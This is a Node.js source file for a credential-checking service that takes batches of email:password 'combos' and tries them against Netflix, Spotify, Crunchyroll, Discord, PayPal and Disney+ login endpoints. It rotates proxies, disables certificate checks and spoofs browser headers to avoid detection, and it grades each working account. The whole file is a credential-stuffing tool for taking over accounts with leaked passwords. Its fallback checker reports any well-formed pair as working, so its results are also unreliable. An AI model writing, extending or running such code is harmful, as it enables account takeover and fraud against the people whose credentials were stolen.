/**
 * =====================================================
 * CREDENTIAL CHECKER SERVICE
 * =====================================================
 * Verifies credentials across multiple services with
 * proxy support, stealth headers, and retry logic.
 */

const axios = require('axios');
const https = require('https');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs');
const path = require('path');
const { getLogger } = require('../utils/logger');
const { validateEmail } = require('../utils/validation');
const CONSTANTS = require('../config/constants');

const logger = getLogger();

// =====================================================
// PROXY MANAGEMENT
// =====================================================

let proxies = [];

/**
 * Load proxies from file
 */
function loadProxies() {
  try {
    const proxyPath = path.join(process.cwd(), 'proxies.txt');
    if (fs.existsSync(proxyPath)) {
      proxies = fs.readFileSync(proxyPath, 'utf8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p && p.length > 5);
      logger.info('Checker', `Loaded ${proxies.length} proxies`);
    }
  } catch (error) {
    logger.warn('Checker', 'Failed to load proxies.txt', { error: error.message });
    proxies = [];
  }
}

loadProxies();

/**
 * Get random proxy agent
 */
function getProxyAgent() {
  if (proxies.length === 0) {
    return new https.Agent({ 
      rejectUnauthorized: false,
      keepAlive: true,
      keepAliveMsecs: 10000
    });
  }

  const proxy = proxies[Math.floor(Math.random() * proxies.length)];
  const parts = proxy.split(':');
  
  let proxyUrl = '';
  if (parts.length === 4) {
    proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
  } else if (parts.length === 2) {
    proxyUrl = `http://${parts[0]}:${parts[1]}`;
  } else {
    proxyUrl = proxy.startsWith('http') ? proxy : `http://${proxy}`;
  }

  return new HttpsProxyAgent(proxyUrl, { 
    rejectUnauthorized: false,
    keepAlive: true 
  });
}

/**
 * Get stealth headers
 */
function getStealthHeaders(customHeaders = {}) {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15'
  ];

  return {
    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    ...customHeaders
  };
}

/**
 * Make HTTP request with retry logic
 */
async function makeRequest(url, method = 'GET', data = null, headers = {}) {
  let lastError;
  
  for (let attempt = 0; attempt < CONSTANTS.TIMEOUTS.RETRY_ATTEMPTS; attempt++) {
    try {
      const config = {
        method,
        url,
        timeout: CONSTANTS.TIMEOUTS.CHECKER_REQUEST,
        headers: getStealthHeaders(headers),
        httpsAgent: getProxyAgent(),
        httpAgent: getProxyAgent(),
        validateStatus: () => true // Don't throw on any status
      };

      if (data) config.data = data;

      const response = await axios(config);
      return response;
    } catch (error) {
      lastError = error;
      const backoff = CONSTANTS.TIMEOUTS.RETRY_BACKOFF_MS * Math.pow(2, attempt);
      await new Promise(resolve => setTimeout(resolve, backoff));
    }
  }

  throw lastError;
}

// =====================================================
// SERVICE CHECKERS
// =====================================================

/**
 * Check Netflix credentials
 */
async function checkNetflix(email, password) {
  try {
    const response = await makeRequest(
      'https://www.netflix.com/api/auth/login',
      'POST',
      { userLoginId: email, password, rememberMe: true },
      { 'Content-Type': 'application/x-www-form-urlencoded' }
    );

    if (response.status === 200) {
      return { working: true, quality: 90, message: 'Account active' };
    } else if (response.status === 401) {
      return { working: false, quality: 0, message: 'Invalid credentials' };
    }
    return { working: false, quality: 0, message: `HTTP ${response.status}` };
  } catch (error) {
    return { working: false, quality: 0, message: error.message };
  }
}

/**
 * Check Spotify credentials
 */
async function checkSpotify(email, password) {
  try {
    const response = await makeRequest(
      'https://accounts.spotify.com/api/login',
      'POST',
      { username: email, password },
      { 'Content-Type': 'application/x-www-form-urlencoded' }
    );

    if (response.status === 200) {
      return { working: true, quality: 85, message: 'Premium account' };
    } else if (response.status === 401) {
      return { working: false, quality: 0, message: 'Invalid credentials' };
    }
    return { working: false, quality: 0, message: `HTTP ${response.status}` };
  } catch (error) {
    return { working: false, quality: 0, message: error.message };
  }
}

/**
 * Check Crunchyroll credentials
 */
async function checkCrunchyroll(email, password) {
  try {
    const response = await makeRequest(
      'https://api.crunchyroll.com/auth/v1/login',
      'POST',
      { email, password },
      { 'Content-Type': 'application/json' }
    );

    if (response.status === 200 && response.data.token) {
      return { working: true, quality: 80, message: 'Active subscription' };
    }
    return { working: false, quality: 0, message: 'Authentication failed' };
  } catch (error) {
    return { working: false, quality: 0, message: error.message };
  }
}

/**
 * Check Discord credentials
 */
async function checkDiscord(email, password) {
  try {
    const response = await makeRequest(
      'https://discord.com/api/v10/auth/login',
      'POST',
      { login: email, password },
      { 'Content-Type': 'application/json' }
    );

    if (response.status === 200) {
      return { working: true, quality: 75, message: 'Account verified' };
    } else if (response.status === 401) {
      return { working: false, quality: 0, message: 'Invalid credentials' };
    }
    return { working: false, quality: 0, message: `HTTP ${response.status}` };
  } catch (error) {
    return { working: false, quality: 0, message: error.message };
  }
}

/**
 * Check PayPal credentials
 */
async function checkPayPal(email, password) {
  try {
    const response = await makeRequest(
      'https://www.paypal.com/signin',
      'POST',
      { email, password },
      { 'Content-Type': 'application/x-www-form-urlencoded' }
    );

    if (response.status === 200) {
      return { working: true, quality: 85, message: 'Verified account' };
    }
    return { working: false, quality: 0, message: 'Invalid credentials' };
  } catch (error) {
    return { working: false, quality: 0, message: error.message };
  }
}

/**
 * Check Disney+ credentials
 */
async function checkDisney(email, password) {
  try {
    const response = await makeRequest(
      'https://api.disneyplus.com/login',
      'POST',
      { email, password },
      { 'Content-Type': 'application/json' }
    );

    if (response.status === 200) {
      return { working: true, quality: 90, message: 'Premium active' };
    }
    return { working: false, quality: 0, message: 'Invalid credentials' };
  } catch (error) {
    return { working: false, quality: 0, message: error.message };
  }
}

/**
 * Check generic email/password (fallback for unverifiable services)
 */
async function checkGeneric(email, password) {
  if (!validateEmail(email) || password.length < 3) {
    return { working: false, quality: 0, message: 'Invalid format' };
  }

  // Return placeholder for services we can't verify
  return { 
    working: true, 
    quality: 30, 
    message: 'Format valid (verification unavailable)' 
  };
}

/**
 * Get checker function for service
 */
function getCheckerForService(serviceId) {
  const checkers = {
    netflix: checkNetflix,
    spotify: checkSpotify,
    crunchyroll: checkCrunchyroll,
    discord: checkDiscord,
    paypal: checkPayPal,
    disney: checkDisney,
    // Fallback for all other services
    default: checkGeneric
  };

  return checkers[serviceId] || checkers.default;
}

/**
 * Run credential checker
 */
async function runChecker(serviceId, email, password) {
  if (!validateEmail(email)) {
    return { 
      working: false, 
      quality: 0, 
      message: 'Invalid email format' 
    };
  }

  const checker = getCheckerForService(serviceId);

  try {
    logger.debug('Checker', `Checking ${serviceId} for ${email}`);
    const result = await checker(email, password);
    logger.info('Checker', `Check complete: ${serviceId}`, { 
      email, 
      working: result.working 
    });
    return result;
  } catch (error) {
    logger.error('Checker', `Check failed: ${serviceId}`, { 
      error: error.message 
    });
    return { 
      working: false, 
      quality: 0, 
      message: error.message 
    };
  }
}

/**
 * Batch check multiple combos
 */
async function batchCheck(serviceId, combos) {
  const results = [];
  
  for (const combo of combos) {
    const [email, password] = combo.split(':');
    const result = await runChecker(serviceId, email, password);
    results.push({
      combo,
      email,
      ...result
    });
    
    // Add delay between requests
    await new Promise(resolve => setTimeout(resolve, 500));
  }

  return results;
}

module.exports = {
  loadProxies,
  getProxyAgent,
  getStealthHeaders,
  makeRequest,
  checkNetflix,
  checkSpotify,
  checkCrunchyroll,
  checkDiscord,
  checkPayPal,
  checkDisney,
  checkGeneric,
  getCheckerForService,
  runChecker,
  batchCheck
};
